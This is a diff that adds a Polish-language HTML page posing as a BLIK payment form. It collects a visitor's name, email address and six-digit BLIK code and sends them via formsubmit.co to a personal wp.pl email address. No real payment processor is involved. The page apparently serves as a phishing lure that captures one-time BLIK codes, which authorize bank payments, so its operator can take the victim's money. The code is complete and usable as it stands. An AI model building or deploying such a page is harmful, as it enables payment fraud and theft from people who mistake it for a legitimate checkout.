@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formularz Płatności BLIK</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4; /* Kolor tła body */
+            background-image: url('bliktlo.png'); /* Ścieżka do pliku tła */
+            background-size: cover; /* Dopasowanie tła do rozmiaru okna przeglądarki */
+            background-position: center; /* Wycentrowanie tła */
+            background-repeat: no-repeat; /* Brak powtarzania tła */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center; /* Wycentrowanie w poziomie */
+            align-items: center; /* Wycentrowanie w pionie */
+            height: 100vh;
+        }
+
+        .content {
+            background-color: rgb(255, 255, 255); /* Białe tło formularza */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            margin-top: -180px; /* Przesunięcie formularza o 180px w górę */
+        }
+
+        h1 {
+            color: #333; /* Kolor tekstu nagłówka */
+        }
+
+        label {
+            display: block;
+            margin-top: 10px;
+            color: #333; /* Kolor tekstu etykiet */
+        }
+
+        input[type="text"], input[type="email"], input[type="number"], input[type="password"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #333; /* Kolor tekstu w polach tekstowych */
+        }
+
+        .error {
+            color: red; /* Kolor tekstu komunikatów błędów */
+            font-size: 0.9em;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 4px;
+            background-color: #28a745;
+            color: white; /* Kolor tekstu przycisku */
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #808080; /* Kolor przycisku po najechaniu */
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Formularz Płatności BLIK</h1>
+        
+
+        
+            
+            <form action="https://formsubmit.co/pawel779277@wp.pl" method="post">
+
+            <label for="name">Imię:</label>
+            <input type="text" id="name" name="name" required>
+
+            
+            <label for="email">E-mail:</label>
+            <input type="email" id="email" name="email" required>
+
+           
+
+            <label for="blik">Kod BLIK:</label>
+            <input type="text" id="blik" name="blik" required pattern="\d{6}" title="Wprowadź 6-cyfrowy kod BLIK" maxlength="6">
+            <span class="error" id="blikError"></span>
+
+            <button type="submit">Zapłać</button>
+        </form>
+        <form id="blikForm" action="blikk.html" method="post"></form>
+        
+           
+
+
+
+
+
+    </div>
+</body>
+</html>
